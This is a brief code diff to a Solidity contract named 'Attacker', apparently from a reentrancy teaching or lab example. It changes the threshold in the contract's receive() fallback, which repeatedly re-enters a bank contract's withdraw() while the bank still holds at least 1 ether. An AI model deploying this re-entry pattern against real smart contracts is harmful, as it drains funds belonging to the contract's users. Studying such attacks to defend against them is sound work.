@@ -17,7 +17,7 @@ contract Attacker {
     }
 
     receive() external payable {
-        if (address(bank).balance >= 1) {
+        if (address(bank).balance >= 1 ether) {
             bank.withdraw();
         }
     }
